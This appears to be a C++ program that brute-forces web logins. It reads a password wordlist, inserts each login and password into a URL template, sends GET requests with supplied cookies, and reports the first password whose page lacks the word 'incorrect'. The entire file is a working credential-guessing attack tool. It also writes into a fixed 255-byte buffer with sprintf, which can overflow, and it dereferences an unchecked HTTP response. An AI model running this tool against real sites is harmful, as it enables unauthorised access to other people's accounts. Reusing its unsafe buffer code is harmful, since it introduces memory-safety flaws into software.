#include <iostream>
#include <string>
#include <iostream>
#include <vector>
#include <filesystem>
#include <iomanip>

#include "thirdparty/cpp-httplib/httplib.h"

using namespace std;

vector<string> read_passwords(filesystem::path& passwordPath)
{
	vector<string> passwords;

	ifstream file{passwordPath};

	for(string password; getline(file, password);)
	{
		passwords.push_back(password);
	}

	return passwords;
}

using Login = string;
using Password = string;
using Result = pair<Login, Password>;

struct Bruter
{
public:
	Bruter(const string& login, const vector<string>& passwords, const string& cookies = "") : m_login{login}, m_passwords{passwords}, m_cookies{cookies} {}
	Bruter(const string& login, vector<string>&& passwords, const string& cookies = "") : m_login{login}, m_passwords{move(passwords)}, m_cookies{cookies} {}

	Result brute(const string& host, const string& resourceTmpl, const string& failMes)
	{
		for(const auto& password: m_passwords)
		{
			const string resource {insert_login_pass(resourceTmpl, m_login, password)};

			if(resource.empty())
				continue;
#if !defined(DEBUG)
			cout << "Try url: " << (host + resource) << endl;
#endif
			const string htmlPage{try_load(host, resource)};
#if defined(DEBUG)
			cout << "\r\n" << htmlPage << endl;
#endif
			if(!htmlPage.empty() && htmlPage.find(failMes) == string::npos)
			{
				return {m_login, password};
			}
		}

		return {};
	}

private:
	string try_load(const string& host, const string& resource)
	{
		httplib::Headers header = {
			{"Cookie", m_cookies}
		};

		httplib::Client cli {host};

		auto res {cli.Get(resource, header)};

#if defined(DEBUG)
		cout << "Host: " << host << " resource: " << resource << ". Get status: " << res->status << endl;
#endif

		if(res->status == 200)
			return res->body;

		return {};
	}

	string insert_login_pass(const string& resTemplate, const string& login, const string& pass)
	{
		char newStr[255];		

		sprintf(newStr, resTemplate.c_str(), login.c_str(), pass.c_str());

		return {newStr};
	}

private:
	string m_login;
	vector<string> m_passwords;
	string m_cookies;
};

int main(int argc, char* argv[])
{
	if(argc != 6)
	{
		cout << "Wrong arguments\n";
		return 1;
	}

	filesystem::path passwordsFile{argv[2]};

	if(!filesystem::exists(passwordsFile))
	{
		cout << "File no exists: " << argv[2] << endl;
	}

	const auto passwords {read_passwords(passwordsFile)};
	const string login {argv[1]};

	const string host{argv[3]};
	const string resource {argv[4]};

	const string cookies {argv[5]};

	Bruter mger(login, move(passwords), cookies);

	auto [login_, password_] = mger.brute(host, resource, "incorrect");

	cout << "Login: " << quoted(login_) << " password: " << quoted(password_) << endl;
}
